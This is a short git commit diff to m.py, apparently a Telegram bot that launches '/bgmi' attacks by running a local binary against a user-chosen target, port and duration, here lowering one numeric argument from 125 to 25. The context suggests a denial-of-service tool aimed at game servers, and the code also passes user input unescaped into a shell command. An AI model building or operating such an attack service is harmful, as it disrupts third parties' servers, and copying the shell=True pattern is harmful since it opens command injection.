12f6925dc9ecb52cdb5c80d771f096b937412088
itsabbbyy <abhishekkmeena1982@gmail.com>
2024-10-15 22:51:15 +0530

    Update m.py

--- m.py
+++ m.py
@@ -296,7 +296,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  
-                full_command = f"./bgmi {target} {port} {time} 125"
+                full_command = f"./bgmi {target} {port} {time} 25"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  
